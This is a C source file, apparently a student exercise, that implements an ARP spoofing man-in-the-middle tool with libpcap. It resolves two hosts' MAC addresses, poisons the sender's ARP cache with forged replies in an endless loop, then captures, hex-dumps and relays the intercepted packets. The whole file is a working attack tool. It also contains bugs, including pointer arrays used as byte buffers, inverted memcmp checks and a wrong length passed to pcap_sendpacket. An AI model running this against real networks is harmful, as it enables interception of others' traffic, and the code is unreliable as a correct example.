#include <pcap/pcap.h> // pcap library
#include <netinet/if_ether.h>//ether_header
#include <netinet/ip.h>//ip
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

//This is only for eth0 network device. if you want to change go getLocalAddrInfo and rename the eth0 as your network device
//2018-08-13 AYH

#define ARP_PACKET_SIZE 60

int getLocalAddrInfo(char *ip_buf, char *mac_buf); // Local IP + Local Mac
void str2hexMac(char *string_mac, uint8_t *hex_mac); // aa:aa:aa:aa:aa:aa
void str2hexIp(char *string_ip, uint8_t *hex_ip); // aaa.aaa.aaa.aaa
void sendArpPacket(pcap_t *p, char *src_mac_buf, char *dst_mac_buf, char *src_ip_buf, char *dst_ip_buf, u_short option);
/*
void sendPacket(pcap_t *p, char *src_mac_buf, char *dst_mac_buf );
*/
int main(int argc, char * argv[])
{
	pcap_t *handle;	 	//handler
	char *dev;	// network device enp0s3

	char errbuf[PCAP_ERRBUF_SIZE];	// error
	struct pcap_pkthdr *header;	// pcap header time, caplen, len
    const u_char *packet;		// actual packet
	
	if(argc != 4){// 
		printf("wrong input\n");
		exit(1);
	}

	handle = pcap_open_live(argv[1], BUFSIZ, 1, 1000, errbuf); // packet capture
     //dev, snaplen, promiscuous mode, to_ms, errbuf -> return null
	if (handle == NULL) {
		printf("pcap_open_error\n");
		exit(1);
	}

	// get local ip, mac addr
	uint8_t local_ip_strbuf[16] = {0};
	uint8_t local_mac_strbuf[18] = {0};	
	if(!getLocalAddrInfo(local_ip_strbuf, local_mac_strbuf))
	{
		printf("get local error\n");
		exit(1);	
	}

	printf("get local!\n");
	struct ether_header *ether_packet; //dst eth addr, src eth addr, ethr_type
	struct ether_arp *arp_packet; // ea_hdr, sender hardware addr, sender protocal address, target hardware address, target protocal address
	struct ip* ip_packet;
	int check;
	int check2=0; 
	int check3=0;
	char receiver_mac[18] = {0}; 
	char sender_mac[18] = {0};
	while(1) { 
		sendArpPacket(handle, local_mac_strbuf, "FF:FF:FF:FF:FF:FF", local_ip_strbuf, argv[2], 1); // broadcast who has sender ip?  tell me
		sendArpPacket(handle, local_mac_strbuf, "FF:FF:FF:FF:FF:FF", local_ip_strbuf, argv[3], 1); // broadcast who has receiver ip?  tell me
		printf("broadcast arp request to sender and receiver\n");
		check = pcap_next_ex(handle, &header, &packet);
		
		if(check == 0) // timeout
			printf("time out\n");
		else if(check == -1) // error		
			printf(" pcap next error\n");
		
		ether_packet = packet;
		if(ntohs(ether_packet->ether_type) == 0x0806)
		{
		arp_packet = packet + sizeof(struct ether_header);
		uint8_t *sender_ip[4];
		uint8_t *receiver_ip[4];
		str2hexIp(argv[2], sender_ip);
		str2hexIp(argv[3], receiver_ip);

		if(memcmp(arp_packet->arp_spa, sender_ip, 4) && ntohs(arp_packet->ea_hdr.ar_op) == 2)//receiver mac 
			{
			sprintf(sender_mac, "%02x:%02x:%02x:%02x:%02x:%02x", arp_packet->arp_sha[0]	, arp_packet->arp_sha[1], arp_packet->arp_sha[2], arp_packet->arp_sha[3], arp_packet->arp_sha[4], arp_packet->arp_sha[5]);	
			printf("I got sender mac %s\n", sender_mac);
			check2++;
			}
		if(memcmp(arp_packet->arp_spa, receiver_ip, 4) && ntohs(arp_packet->ea_hdr.ar_op) == 2)//sender mac
			{
			sprintf(receiver_mac, "%02x:%02x:%02x:%02x:%02x:%02x", arp_packet->arp_sha[0], arp_packet->arp_sha[1], arp_packet->arp_sha[2], arp_packet->arp_sha[3], arp_packet->arp_sha[4], arp_packet->arp_sha[5]);
			printf("I got receiver mac %s\n", receiver_mac);
			check3++;
			}
		if(check2 > 0 && check3 > 0)
		{
			printf("I got both mac\n");
			break;
		}
		}
	sleep(3);
	}
	
		uint8_t *send_mac[6];
		uint8_t *recv_mac[6];
		uint8_t *broadcast_mac[6];
		uint8_t *local_mac[6];
		str2hexMac(local_mac_strbuf, local_mac);
		str2hexMac(sender_mac, send_mac);
		str2hexMac(receiver_mac, recv_mac);
		str2hexMac("FF:FF:FF:FF:FF:FF", broadcast_mac);
		printf("spoofing!\n");
		int size = 0;
		while(1)
	{
		sendArpPacket(handle, local_mac_strbuf, sender_mac, argv[3], argv[2], 2); // send arp reply to sender forever
		check = pcap_next_ex(handle, &header, &packet);
		size = header->caplen;
		if(check == 0) // timeout
			printf("time out\n");
		else if(check == -1) // error		
			printf(" pcap next error\n");
		else //capture packet
		ether_packet = (struct ether_header *)packet;
		ip_packet = (struct ip *)(packet + sizeof(struct ether_header)); 
		
		printf("packet capture\n");
		if( memcmp(ether_packet->ether_shost, send_mac,6) &&memcmp(ether_packet->ether_dhost, local_mac,6)) //relay packet 
		{
			memcpy(ether_packet->ether_shost, local_mac,6);
			memcpy(ether_packet->ether_dhost, recv_mac,6);
			printf("I got packet from sender\n");
			int j=0;
			printf("Packet: ");
			for(j = 0; j <header->caplen; j++)
			{
					if(j%16==0)
					printf("\n");
				printf("%02x ", packet[j]);	
			}
			printf("\nsize : %d \n", j);
			/*
			printf("Packet: ");
			for(int i = 0; i<size; i++)
			{
				printf("%02x ", packet[i]);		
			}
			printf("%d \n", i);
			*/
			if(pcap_sendpacket(handle, packet, size == -1))
			{
				printf("send packet relay Error\n");
				exit(1);
			}
			printf("relay the packet!\n");
		}
		if(memcmp(ether_packet->ether_dhost, broadcast_mac, 6) && (memcmp(ether_packet->ether_shost, send_mac, 6) || memcmp(ether_packet->ether_shost, recv_mac,6))) //sender mac broadcast
		{
			sendArpPacket(handle, local_mac_strbuf, sender_mac, argv[3], argv[2], 2); // send arp reply to sender forever
			printf("sender or receiver send broadcast -> spoofing!\n");
		}
		sleep(2);
	}
	pcap_close(handle);
	return 0;
}

int getLocalAddrInfo(char *ip_buf, char *mac_buf) 
{
	FILE * fp;
	fp = popen("ifconfig eth0 | grep 'inet ' | awk '{print $2}'", "r");
	if(fp == NULL)
		{
		printf("FILE OPEN ERROR IN getlocal_addrInfo (get mac addr)\n");
		exit(1);
		}
	if(fgets(ip_buf, 16, fp) == NULL)
		return 0;
	pclose(fp);
	fp = popen("ifconfig eth0 | grep 'ether' | awk '{print $2}'", "r");
	if(fp == NULL)
	{
		printf("FILE OPEN ERROR IN getlocal_addrInfo (get mac addr)\n");
		exit(1);
	}
	if(fgets(mac_buf, 18, fp) == NULL)
		return 0;	
	pclose(fp);
	printf("local IP : %s\n", ip_buf);
	printf("local MAC : %s\n", mac_buf);
	return 1;	
}

void str2hexMac(char *string_mac, uint8_t *hex_mac)
{
	sscanf(string_mac, "%x:%x:%x:%x:%x:%x", hex_mac, hex_mac + 1 , hex_mac + 2, hex_mac + 3, hex_mac + 4, hex_mac + 5);
}

void str2hexIp(char *string_ip, uint8_t *hex_ip)
{
	sscanf(string_ip, "%d.%d.%d.%d", hex_ip, hex_ip + 1 ,hex_ip + 2, hex_ip + 3);
}

void sendArpPacket(pcap_t *p, char *src_mac_buf, char *dst_mac_buf, char *src_ip_buf, char *dst_ip_buf, u_short option)
{
	struct ether_header* p_eth;
	struct ether_arp* p_arp;

	u_char buf[ARP_PACKET_SIZE] = {0}; 
	p_eth = (struct ether_header *)buf;
	p_arp = (struct ether_arp *)(buf + sizeof(struct ether_header));

	// make ether_arp->ea_hdr
	p_arp->ea_hdr.ar_hrd = htons(1); //hardware address
	p_arp->ea_hdr.ar_pro = htons(0x0800); //protocal address
	p_arp->ea_hdr.ar_hln = 6; // hardware length
	p_arp->ea_hdr.ar_pln = 4;// prrotocol length
	p_arp->ea_hdr.ar_op = htons(option); // arp opcode

	uint8_t *src_mac[6];
	str2hexMac(src_mac_buf, src_mac); 

	uint8_t *dst_mac[6];
	if(option == 1)
		str2hexMac("FF:FF:FF:FF:FF:FF", dst_mac);		
	else
		str2hexMac(dst_mac_buf, dst_mac);

	uint8_t *src_ip[4];
	str2hexIp(src_ip_buf, src_ip);
	uint8_t *dst_ip[4];
	str2hexIp(dst_ip_buf, dst_ip);

	// make arp
	memcpy(p_arp->arp_sha, src_mac, 6);
	memcpy(p_arp->arp_spa, src_ip, 4);
	memcpy(p_arp->arp_tha, dst_mac, 6);
	memcpy(p_arp->arp_tpa, dst_ip, 4);
	//make eth
	memcpy(p_eth->ether_dhost, dst_mac, 6);
	memcpy(p_eth->ether_shost, src_mac, 6);
	p_eth->ether_type = htons(0x0806);

	if(pcap_sendpacket(p, buf, ARP_PACKET_SIZE) == -1)
	{
		printf("Error\n");
		exit(1);
	}
}

/*
void sendPacket(pcap_t *p, char *src_mac_buf, char *dst_mac_buf)
{
	struct ether_header* p_eth;

	u_char buf[PACKET_SIZE] = {0}; 
	p_eth = (struct ether_header *)buf;

	uint8_t src_mac[6];
	str2hexMac(src_mac_buf, src_mac); 

	uint8_t dst_mac[6];
	str2hexMac(dst_mac_buf, dst_mac);

	memcpy(p_eth->ether_dhost, dst_mac, 6);
	memcpy(p_eth->ether_shost, src_mac, 6);

	if(pcap_sendpacket(p, buf, PACKET_SIZE) == -1)
	{
		printf("send packet relay Error\n");
		exit(1);
	}
}
*/
